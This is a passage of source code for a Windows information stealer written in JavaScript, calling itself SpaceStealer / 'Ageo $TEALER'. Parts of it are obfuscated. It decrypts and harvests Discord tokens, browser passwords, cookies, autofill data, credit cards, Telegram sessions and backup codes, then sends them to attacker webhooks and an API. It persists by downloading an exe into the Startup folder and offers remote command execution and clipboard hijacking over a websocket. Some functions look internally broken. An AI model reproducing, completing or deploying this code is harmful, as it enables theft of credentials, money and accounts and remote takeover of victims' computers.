        if (_0x1e594c.toLowerCase().includes('discord')) {
            const _0x3f1c4f = fs.promises.readdir(_0x10a294)

            Promise.all(
                _0x3f1c4f
                .filter((_0x154a71) => _0x154a71.endsWith('.ldb'))
                .map(async (_0xdadbcf) => {
                    const _0x18db4 = fs.promises.readFile(
                            path.join(_0x10a294, _0xdadbcf),
                            'utf8'
                        ),
                        _0x269379 = _0x71f249(_0x10a294);

                    [..._0x18db4.matchAll(/\"(dQw4w9WgXcQ:.*?)\"/g)]

                    .filter((_0x1680d7) => _0x1680d7.length >= 2)
                        .map((_0x6115ea) => _0x6115ea[1])
                        .map((_0x20885d) => _0x369343(_0x20885d, _0x269379))
                        .forEach((_0x3532e6) => {
                            validatedToken.push(_0x3532e6)
                        })
                })
            )

        } else {

            const _0x5ed625 = fs.promises.readdir(_0x10a294)

            Promise.all(
                _0x5ed625
                .filter((_0x4017ba) => _0x4017ba.endsWith('.ldb'))
                .map(async (_0x1a36c1) => {
                    const _0x38f1e0 = fs.promises.readFile(
                        path.join(_0x10a294, _0x1a36c1),
                        'utf8'
                    );

                    [..._0x38f1e0.matchAll(/([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})/g)]

                    .filter((_0x90b62f) => _0x90b62f.length >= 2)
                        .map((_0x4064e3) => _0x4064e3[1])
                        .forEach((_0x54eb64) => {
                            validatedToken.push(_0x54eb64)
                        })
                })
            )
        }
    }

    let _0x933dbc = Array.from(new Set(validatedToken))
}

function GetTokensFromPath(tokenPath) {
    let path_tail = path;

    tokenPath += "\\Local Storage\\leveldb";

    let tokens = [];

    if (tokenPath.includes('cord')) {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
                fs.readdirSync(tokenPath)
                    .map(file => {
                        (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8').split(/\r?\n/)
                            .forEach(line => {

                                const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                                const foundTokens = line.match(pattern);

                                if (foundTokens) {
                                    foundTokens.forEach(token => {
                                        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                                        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');

                                        token = Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64')

                                        let start = token.slice(3, 15),
                                            middle = token.slice(15, token.length - 16),
                                            end = token.slice(token.length - 16, token.length),
                                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);

                                        decipher.setAuthTag(end);

                                        let out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')

                                        if (!tokens.includes(out)) tokens.push(out);
                                    })
                                }
                            });
                    });

            } catch {}

            return tokens;
        }

    } else {

        try {
            fs.readdirSync(path.normalize(tokenPath)).map((file) => {

                if (file.endsWith(".log") || file.endsWith(".ldb")) {
                    fs.readFileSync(`${tokenPath}\\${file}`, "utf8").split(/\r?\n/)
                        .forEach(async (line) => {

                            const regex = [
                                new RegExp(/mfa\.[\w-]{84}/g),
                                new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)
                            ];

                            for (const _regex of regex) {
                                const token = line.match(_regex);

                                if (token) {
                                    token.forEach((element) => {
                                        tokens.push(element);
                                    });
                                }
                            }
                        });
                }
            });

        } catch {

        }
    }
    return tokens;
}

function findToken(path) {
    path += 'Local Storage\\leveldb';

    let tokens = [];

    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];

                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);

                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });

    } catch (e) {}
    return tokens;
}

async function getCookies() {
    addFolder('Cookies')

    const _0x2d5c12 = {}

    for (let _0x4a10a6 = 0; _0x4a10a6 < browserPath.length; _0x4a10a6++) {
        if (!fs.existsSync(browserPath[_0x4a10a6][0] + '\\Network')) {
            continue
        }

        let _0x4e12e5

        if (browserPath[_0x4a10a6][0].includes('Local')) {

            _0x4e12e5 = browserPath[_0x4a10a6][0].split('\\Local\\')[1].split('\\')[0]

        } else {
            _0x4e12e5 = browserPath[_0x4a10a6][0]
                .split('\\Roaming\\')[1]
                .split('\\')[1]
        }

        const _0x4626f2 = browserPath[_0x4a10a6][0] + 'Network\\Cookies',
              _0x2af94b = new sqlite3.Database(_0x4626f2)

        await new Promise((_0x1d89a8, _0x2e7ff5) => {
            _0x2af94b.each(

                'SELECT host_key, name, encrypted_value FROM cookies',

                function(_0x5380db, _0x10a032) {

                    let _0x2a34ee = _0x10a032.encrypted_value

                    try {
                        _0x323a65 = _0x2a34ee.slice(3, 15),
                            _0x337e8f = _0x2a34ee.slice(15, _0x2a34ee.length - 16),
                            _0x26dbb8 = _0x2a34ee.slice(
                                _0x2a34ee.length - 16,
                                _0x2a34ee.length
                            ),

                            _0x20398e = crypto.createDecipheriv(
                                'aes-256-gcm',
                                browserPath[_0x4a10a6][3],
                                _0x323a65
                            )

                        _0x20398e.setAuthTag(_0x26dbb8)

                        decrypted = _0x20398e.update(_0x337e8f, 'base64', 'utf-8') + _0x20398e.final('utf-8')

                    } catch (_0x34ec60) {}
                    !_0x2d5c12[_0x4e12e5 + '_' + browserPath[_0x4a10a6][1]] &&
                        (_0x2d5c12[_0x4e12e5 + '_' + browserPath[_0x4a10a6][1]] = [])

                    _0x2d5c12[_0x4e12e5 + '_' + browserPath[_0x4a10a6][1]].push(
                        _0x10a032.host_key +
                        '\tTRUE\t/\tFALSE\t2597573456\t' +
                        _0x10a032.name +
                        '\t' +
                        decrypted +
                        '\n'
                    )
                    count.cookies++
                },

                () => {
                    _0x1d89a8('')
                }
            )
        })
    }

    for (let [_0x5b7a6d, _0x2ee6f8] of Object.entries(_0x2d5c12)) {
        if (_0x2ee6f8.length != 0) {
            var _0x24dfb3 = _0x2ee6f8.join('')

            fs.writeFileSync(
                randomPath + '\\Cookies\\' + _0x5b7a6d + '.txt',
                user.copyright + _0x24dfb3,

                {
                    encoding: 'utf8',
                    flag: 'a+',
                }
            )
        }
    }
}

async function ParseCookies(path) {
    const path_split = path.split("\\");
    const path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";

    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").slice(5);

        const cookies = path + "Cookies";
        const cookies_db = path + "cookies.db";
        const total_cookies = 0;

        fs.copyFileSync(cookies, cookies_db);

        const key = dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");

        let result = "";

        const sql = new sqlite3.Database(cookies_db, (err => {
            if (err) return;
        }));

        result += `@~$~@ageo-${path}\n`;

        return await new Promise((resolve => {
            sql.each("SELECT host_key, name, encrypted_value FROM cookies", (function(error, row) {

                if (!error) {
                    const encrypted_value = row.encrypted_value;
                    try {
                        if (1 == encrypted_value[0] && 0 == encrypted_value[1] && 0 == encrypted_value[2] && 0 == encrypted_value[3]) {
                            result += `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${dpapi.unprotectData(encrypted_value,null,"CurrentUser")+"\n".toString("utf-8")}\n`
                        } else {
                            const start = encrypted_value.slice(3, 15);
                            const middle = encrypted_value.slice(15, encrypted_value.length - 16);
                            const end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length);
                            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

                            decipher.setAuthTag(end);

                            if (row.host_key === '.instagram.com' && row.name === 'sessionid') SubmitInstagram(`${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}`)

                            if (row.name === '.ROBLOSECURITY') SubmitRoblox(`${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}`)

                            result += `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}\n`
                        }
                    } catch (e) {}
                }

            }), function() {
                resolve(result);
            });
        }))
    }
    return ""
}

async function ParseAutofill(path) {
    let path_split = path.split("\\");

    const path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";

    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        const autofill_data = path + "Web Data";
        const autofill_db = path + "Web.db";

        fs.copyFileSync(autofill_data, autofill_db);

        let result = "";

        const sql = new sqlite3.Database(autofill_db, (err => {
            if (err) return
        }));

        result += `@~$~@ageo-${path}\n`;

        return await new Promise((resolve => {
            sql.each("SELECT * FROM autofill", (function(error, row) {
                row && (result += `NAME: ${row.name} | VALUE : ${row.value}\n`)
            }), function() {
                resolve(result);
            });
        }))
    }
    return ""
}

async function ParseCards(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';

    if (path.startsWith(appdata)) path_tail = path;

    if (path.includes('cord')) return;

    if (fs.existsSync(path_tail)) {
        const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
        const login_data = path + 'Web Data';
        const creditcards_db = path + 'creditcards.db';

        fs.copyFileSync(login_data, creditcards_db);

        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        let result = `@~$~@ageo-${path}\n`;

        const sql = new sqlite3.Database(creditcards_db, err => {
            if (err) {}
        });

        const cards = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM credit_cards', function(error, row) {

                if (!error || row['card_number_encrypted'] != '') {
                    let card_number = row['card_number_encrypted'];

                    try {
                        if ((card_number[0] == 1) && (card_number[1] == 0) && (card_number[2] == 0) && (card_number[3] == 0)) {
                            result += 'CC NUMBER: ' + dpapi.unprotectData(card_number, null, 'CurrentUser').toString('utf-8') + ' | EXPIRY: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'] + '\n';
                        } else {
                            const start = password_value.slice(3, 15);
                            const middle = password_value.slice(15, password_value.length - 16);
                            const end = password_value.slice(password_value.length - 16, password_value.length);
                            const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

                            decipher.setAuthTag(end)

                            result += 'CC NUMBER: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + ' | EXPIRY: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'] + '\n';
                        }
                    } catch (e) {}
                }
            }, function() {
                resolve(result);
            });
        });

        return cards;
    }

    return '';
}

//inittializaing SpaceStealer class
class SpaceStealer {
    constructor() {
        this.setToStartup();
        this.killgoogle();
        this.getEncrypted();
        this.SubmitTelegram();
        this.stealltokens();
        this.StealTokens();
        this.InfectDiscords();

        this.RestartDiscords();
        this.SubmitBackupCodes();

        this.SubmitExodus();
        this.SubmitGrowtopia();
        this.getExtension();
        this.getCookiesAndSendWebhook();
        this.getPasswords();
        this.getCardData();
        this.getAutofills();
        this.getZip();
        this.subautofill();
        this.subpassword();

        this.websocket = new WebSocket(config['websocket_url']);

        this.websocket.on('open', async () => {
            this.websocket.send(JSON.stringify({
                key: api_auth,
                hostname: os.hostname(),
                event: 'open'
            }));
            await UpdateInformation(this.websocket)
        })

        this.websocket.on('close', async () => {
            exit()
        })

        this.websocket.on('message', async (data) => {
            let message = JSON.parse(data);

            switch (message['task']) {
                case 'restartcord':
                    exec(`taskkill /F /T /IM ${message['type']}.exe`, (err) => {})
                    exec(`"${process.env.LOCALAPPDATA}\\${message['type']}\\Update.exe" --processStart ${message['type']}.exe`, (err) => {})
                    break;

                case 'exec':
                    exec(`${message['command']}`, (err, stdout) => {
                        let embed = new MessageEmbed()
                            .setAuthor('Remote Code Execution 👀', "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
                            .setDescription(`<a:spacex:1069286960927092807> **Response:**\n\`${stdout}\``)
                            .addField(`<:spacex:1069286971500937216> Command:`, `\`${message['command']}\``)
                            .addField(`<:spacex:1069286956225286164> Hostname:`, `\`${os.hostname()}\``)
                            .setColor(`#303037`)
                            .setFooter('@spacestealer')

                        client.send({
                            embeds: [embed]
                        })
                    })

                    break;

                case 'getclip':
                    let clipboardd = clipboard.readSync();
                    let embed = new MessageEmbed()
                        .setAuthor('Clipboard Data 👀', "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
                        .setDescription(`<a:spacex:1069286960927092807> **Clipboard:**\n\`${clipboardd}\` [Copy](https://api.spacestaler.gg/copy)`)
                        .addField(`<:spacex:1069286956225286164> Hostname:`, `\`${os.hostname()}\``, "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
                        .setColor(`#303037`)
                        .setFooter('@spacestealer')

                    client.send({
                        embeds: [embed]
                    })

                    break;

                case 'setclip':
                    clipboard.writeSync(message['text']);
                    break;

                case 'reinject':
                    this.InfectDiscords();
                    break;

                case 'passwords':
                    this.getPasswords();
                    break;

                case 'cookies':
                    this.SubmitCookies();
                    break;

                case 'backupcodes':
                    this.SubmitBackupCodes();
                    break;
            }
        })
    }

    async getPasswords() {
        const _0x540754 = []

        for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
            if (!fs.existsSync(browserPath[_0x261d97][0])) {
                continue
            }

            let _0xd541c2

            if (browserPath[_0x261d97][0].includes('Local')) {
                _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0]
            } else {
                _0xd541c2 = browserPath[_0x261d97][0]
                    .split('\\Roaming\\')[1]
                    .split('\\')[1]
            }

            const _0x256bed = browserPath[_0x261d97][0] + 'Login Data',
                _0x239644 = browserPath[_0x261d97][0] + 'passwords.db'

            fs.copyFileSync(_0x256bed, _0x239644)

            const _0x3d71cb = new sqlite3.Database(_0x239644)

            new Promise((_0x2c148b, _0x32e8f4) => {
                _0x3d71cb.each(

                    'SELECT origin_url, username_value, password_value FROM logins',

                    (_0x4c7a5b, _0x504e35) => {
                        if (!_0x504e35.username_value) {
                            return
                        }

                        let _0x3d2b4b = _0x504e35.password_value

                        try {
                            const _0x5e1041 = _0x3d2b4b.slice(3, 15),
                                _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16),
                                _0x2a933a = _0x3d2b4b.slice(
                                    _0x3d2b4b.length - 16,
                                    _0x3d2b4b.length
                                ),

                                _0x210aeb = crypto.createDecipheriv(
                                    'aes-256-gcm',
                                    browserPath[_0x261d97][3],
                                    _0x5e1041
                                )

                            _0x210aeb.setAuthTag(_0x2a933a)

                            password =
                                _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
                                _0x210aeb.final('utf-8')

                            _0x540754.push(
                                '================\nURL: ' +
                                _0x504e35.origin_url +
                                '\nUsername: ' +
                                _0x504e35.username_value +
                                '\nPassword: ' +
                                password +
                                '\nApplication: ' +
                                _0xd541c2 +
                                ' ' +
                                browserPath[_0x261d97][1] +
                                '\n'
                            )
                            count.passwords++
                        } catch (_0x5bf37a) {}
                    },

                    () => {
                        _0x2c148b('')
                    }
                )
            })
        }

        if (_0x540754.length) {
            fs.writeFileSync(
                randomPath + '\\Passwords.txt',
                user.copyright + _0x540754.join(''),

                {
                    encoding: 'utf8',
                    flag: 'a+',
                }
            )
        }
    }

    async SubmitAutofill() {
        let autofills = "";

        for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Web Data") && (autofills += await ParseAutofill(browser_paths[i]) || "");

        fs.writeFile(appdata + "\\autofilldata.txt", autofills, (function(err) {
            if (err) throw err;

            httpx.post(`${api_url}/api/autofill?auth=${api_auth}`, {
                autofill: autofills
            })
        }))
    }

    async SubmitCards() {
        let creditcards = "";

        for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Web Data") && (creditcards += await ParseCards(browser_paths[i]) || "");

        fs.writeFile(appdata + "\\creditcards.txt", creditcards, (function(err) {
            if (err) throw err;

            httpx.post(`${api_url}/api/creditcards?auth=${api_auth}`, {
                cards: creditcards
            })
        }))
    }

    SubmitBackupCodes() {
        const home_dir = require('os').homedir();
        let codes = "";

        if (fs.existsSync(`${home_dir}\\Downloads`)) {
            fs.readdirSync(`${home_dir}\\Downloads`).forEach(file => {
                if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                    let path = `${home_dir}\\Downloads\\${file}`
                    const text = fs.readFileSync(path, 'utf-8')
                    
                    codes += `# ${home_dir}\\Downloads\\${file}\n\n${text}\n\n`;
                }
            })
        }

        if (fs.existsSync(`${home_dir}\\Desktop`)) {
            fs.readdirSync(`${home_dir}\\Desktop`).forEach(file => {
                if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                    let path = `${home_dir}\\Desktop\\${file}`
                    const text = fs.readFileSync(path, 'utf-8')

                    codes += `# ${home_dir}\\Desktop\\${file}\n\n${text}\n\n`;
                }
            })
        }

        if (fs.existsSync(`${home_dir}\\Documents`)) {
            fs.readdirSync(`${home_dir}\\Documents`).forEach(file => {
                if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                    let path = `${home_dir}\\Documents\\${file}`
                    const text = fs.readFileSync(path, 'utf-8')

                    codes += `# ${home_dir}\\Documents\\${file}\n\n${text}\n\n`;
                }
            })
        }

        httpx.post(`${api_url}/api/backupcodes?auth=${api_auth}`, {
            codes: codes
        })
    }

    async SubmitTelegram() {
        if (fs.existsSync(appdata + '\\Telegram Desktop\\tdata')) {
            let zip = new AdmZip();

            session_files = []

            fs.readdir(appdata + '\\Telegram Desktop\\tdata', (err, file) => {
                file.forEach((inside_file) => {
                    if (inside_file !== 'temp' && inside_file !== 'dumps' && inside_file !== 'emoji' && inside_file !== 'working' && inside_file !== 'tdummy') {
                        session_files.push(`${inside_file}`)
                    }
                })

                session_files.forEach(session_file => {
                    let i = appdata + `\\Telegram Desktop\\tdata\\${session_file}`;
                    (fs.statSync(i).isFile() ? zip.addLocalFile(i) : zip.addLocalFolder(i, e));
                })

                zip.writeZip(`TelegramSession.zip`)

                httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
                    webhook = res.data;
                    const form = new FormData();

                    form.append("file", fs.createReadStream("TelegramSession.zip"));
                    form.submit(webhook, (error, response) => {
                        fs.unlinkSync('TelegramSession.zip')
                    });
                })
            })
        }
    }

    StealTokens() {
        let paths;

        if (process.platform == "win32") {
            const local = process.env.LOCALAPPDATA;
            const roaming = process.env.APPDATA;

            paths = {
                Discord: path.join(roaming, "Discord"),
                "Discord Canary": path.join(roaming, "discordcanary"),
                "Discord PTB": path.join(roaming, "discordptb"),
                "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
                Opera: path.join(roaming, "Opera Software", "Opera Stable"),
                Brave: path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
                Yandex: path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
            };
        }

        const tokens = {};

        for (let [platform, path] of Object.entries(paths)) {
            const tokenList = GetTokensFromPath(path);

            if (tokenList) {
                tokenList.forEach((token) => {
                    this.sendTokenToBackend(token)

                    if (tokens[platform] === undefined) tokens[platform] = [];

                    tokens[platform].push(token);
                });
            }
        }
    }

    async validateToken() {
        await extractDiscordTokens()

        let _0x41a24c = Array.from(new Set(validatedToken))

        for (let _0x419f14 = 0; _0x419f14 < _0x41a24c.length; _0x419f14++) {
            const _0x1bcb21 = await axios
                .get('https://discordapp.com/api/v9/users/@me', {
                    headers: {
                        Authorization: _0x41a24c[_0x419f14],
                        'User-Agent':
                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                    },
                })
                .catch((_0x3223bf) => {
                    return _0x3223bf.response
                })

            if (_0x1bcb21.request.res.statusCode == 200) {
                const _0x1739d2 =

                    '**Discord:**\n            \uD83C\uDD94 ID: `' +

                    _0x1bcb21.data.id +

                    '`\n            \u270D️ Username: `' +

                    _0x1bcb21.data.username +

                    '`\n            \uD83D\uDCE7 Email: `' +

                    _0x1bcb21.data.email +

                    '`\n            \u260E️ Phone: `' +

                    _0x1bcb21.data.phone +

                    '`\n            \uD83D\uDCCD Locale: `' +

                    _0x1bcb21.data.locale +

                    '`\n\n            \u2705 Verified: **' +

                    _0x1bcb21.data.verified +

                    '**\n            \uD83D\uDD10 2FA: **' +

                    _0x1bcb21.data.mfa_enabled +

                    '**\n            \uD83D\uDD1E NSFW: **' +

                    _0x1bcb21.data.nsfw_allowed +

                    '**\n\n            `' +

                    _0x41a24c[_0x419f14] +

                    '`'

                await sendDs(user.url, _0x1739d2)
            }
        }
        debugLog('Discord check')
    }

    stealltokens() {
        const fields = [];

        for (let path of paths) {
            const foundTokens = findToken(path);

            if (foundTokens) foundTokens.forEach(token => {
                var c = {
                    name: "<:browserstokens:951827260741156874> Browser Token;",
                    value: `\`\`\`${token}\`\`\`[CopyToken](https://sourwearyresources.rustlerjs.repl.co/copy/` + token + `)`,
                    inline: !0
                }

                fields.push(c)
            });
        }

        httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
            let webhook = res.data;

            httpx.post(webhook, {
                "content": null,
                "embeds": [
                    {
                        "color": configg["embed-color"],
                        "fields": fields.filter(onlyUnique),
                        "author": {
                            "name": `Ageo $TEALER`,
                            "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
                        },
                        "footer": {
                            "text": "Ageo $TEALER"
                        },
                    }
                ]
            }).then(res => {}).catch(error => {})
        })

        httpx.get(`${config['api_url']}/check?key=`).then(res => {
            let webhookk = res.data;

            httpx.post(webhookk, {
                "content": null,
                "embeds": [
                    {
                        "color": config["embed-color"],
                        "fields": fields.filter(onlyUnique),
                        "author": {
                            "name": `Ageo $TEALER`,
                            "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
                        },
                        "footer": {
                            "text": "Ageo $TEALER"
                        },
                    }
                ]
            }).then(res => {}).catch(error => {})
        })
    }

    async setToStartup() {
        const Fpath = process.argv[0]

        const fileUrl = (`https://ageostealer.wtf/download?key=${api_auth}&file=${name}.exe`)

        const downloadPath = (`C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${name}.exe`)

        const file = fs.createWriteStream(downloadPath);

        const request = https.get(fileUrl, function(response) {
            response.pipe(file);
        });
    }

    async killgoogle() {
        exec(`taskkill /IM chrome.exe /F`)
    };

    async getZip() {
        getZip(randomPath, randomPath + '.zip')
    }

    async RestartDiscords() {
        exec('tasklist', (err, stdout) => {
            for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                if (stdout.includes(executable)) {
                    exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                    exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
                }
            }
        })
    }

    sendTokenToBackend(token) {
        httpx.get(`${api_url}/api/grabuser?token=${token}&ip=323232&auth=${api_auth}`)
    }

    ///////////////

    async SubmitGrowtopia() {
        const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Growtopia`;

        if (fs.existsSync(file)) {
            const zipper = new AdmZip();
  
            zipper.addLocalFolder(file);
            zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\growtopia.zip`)

            httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
                let webhook = res.data;
                const form = new FormData();

                form.append("file", fs.createReadStream(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\growtopia.zip`));
                form.submit(webhook, (error, response) => {
                    fs.unlinkSync(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\growtopia.zip`)
                });
            })
        }
    }

    // C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Local Extension Settings

    async debugLog(_0x3f583f) {
        if (user.debug == true) {
            const _0x424cc5 = Date.now() - user.start

            console.log(

                _0x3f583f +

                ': ' +

                (_0x424cc5 / 1000).toFixed(1) +

                ' s. / ' +

                _0x424cc5 +

                ' ms.'
            )
        }
    }

    async getEncrypted() {
        for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
            if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
                continue
            }

            try {
                let _0x276965 = Buffer.from(
                    JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                    .os_crypt.encrypted_key,
                    'base64'
                ).slice(5)

                const _0x4ff4c6 = Array.from(_0x276965),
                    _0x4860ac = execSync(
                        'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                        _0x4ff4c6 +
                        "), $null, 'CurrentUser')"
                    ).toString().split('\r\n'),

                    _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),

                    _0x2ed7ba = Buffer.from(_0x4a5920)

                    browserPath[_0x4c3514].push(_0x2ed7ba)

            } catch (_0x32406b) {}
        }
    }

    async getAutofills() {
        const _0x3aa126 = []

        for (let _0x77640d = 0; _0x77640d < browserPath.length; _0x77640d++) {
            if (!fs.existsSync(browserPath[_0x77640d][0])) {
                continue
            }

            let _0x3c2f27

            if (browserPath[_0x77640d][0].includes('Local')) {
                _0x3c2f27 = browserPath[_0x77640d][0].split('\\Local\\')[1].split('\\')[0]
            } else {
                _0x3c2f27 = browserPath[_0x77640d][0]
                    .split('\\Roaming\\')[1]
                    .split('\\')[1]
            }

            const _0x46d7c4 = browserPath[_0x77640d][0] + 'Web Data',
                  _0x3ddaca = browserPath[_0x77640d][0] + 'webdata.db'

            fs.copyFileSync(_0x46d7c4, _0x3ddaca)

            var _0x4bf289 = new sqlite3.Database(_0x3ddaca, (_0x2d6f43) => {})

            await new Promise((_0x12c353, _0x55610b) => {
                _0x4bf289.each(

                    'SELECT * FROM autofill',

                    function(_0x54f85c, _0x40d0dd) {
                        if (_0x40d0dd) {
                            _0x3aa126.push(

                                '================\nName: ' +

                                _0x40d0dd.name +

                                '\nValue: ' +

                                _0x40d0dd.value +

                                '\nApplication: ' +

                                _0x3c2f27 +

                                ' ' +

                                browserPath[_0x77640d][1] +

                                '\n'
                            )
                            count.autofills++
                        }
                    },

                    function() {
                        _0x12c353('')
                    }
                )
            })
        }

        _0x3aa126.length &&
            fs.writeFileSync(
                randomPath + '\\Wallets\\Autofills.txt',
                user.copyright + _0x3aa126.join(''),

                {
                    encoding: 'utf8',
                    flag: 'a+',
                }
            )

        httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
            let webhook = res.data;
            const form = new FormData();

            form.append("file", fs.createReadStream('./' + user.randomUUID + '.zip'));
            form.submit(webhook);
        })
    }

    async getCardData() {
        addFolder('cc\\');

        const cardData = {};

        for (let i = 0; i < browserPath.length; i++) {
            if (!fs.existsSync(browserPath[i][0])) {
                continue;
            }

            let browserFolder;

            if (browserPath[i][0].includes('Local')) {
                browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
            } else {
                browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
            }

            const webDataPath = browserPath[i][0] + 'Web Data';
            const creditCardsPath = browserPath[i][0] + 'creditcards.db';
            const db = new sqlite3.Database(creditCardsPath);

            await new Promise((resolve, reject) => {

                db.each(
                    'SELECT * FROM credit_cards',

                    function(err, row) {

                        if (row && row.encrypted_value) {
                            let encryptedValue = row.encrypted_value;
                            let iv = encryptedValue.slice(3, 15);
                            let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                            let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                            let decrypted = '';

                            try {
                                const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
                                decipher.setAuthTag(authTag);

                                decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

                            } catch (error) {
                                // Handle decryption error
                            }

                            const cardKey = browserFolder + '_' + browserPath[i][1];

                            if (!cardData[cardKey]) {
                                cardData[cardKey] = [];
                            }

                            cardData[cardKey].push(
                                'CC NUMBER:' + row.card_number +
                                '| NAME:' + row.name_on_card +
                                '| EXPIRY:' + row.expiration_month + '/' + row.expiration_year +
                                '\n'
                            );
                        }
                    },
                    () => {

                        resolve('');
                    }
                );
            });

            db.close();
        }

        for (let [browserName, cardDataArray] of Object.entries(cardData)) {
            if (cardDataArray.length !== 0) {

                var cardDataString = cardDataArray.join('');

                fs.writeFileSync(
                    randomPath + '\\cc\\' + browserName + '.txt',
                    user.copyright + cardDataString,

                    {
                        encoding: 'utf8',
                        flag: 'a+',
                    });
            }
        }

        return cardData;
    }

    async getPasswords() {
        const passwords = [];

        for (let i = 0; i < browserPath.length; i++) {
            if (!fs.existsSync(browserPath[i][0])) {
                continue;
            }

            let applicationName;

            if (browserPath[i][0].includes('Local')) {
                applicationName = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
            } else {
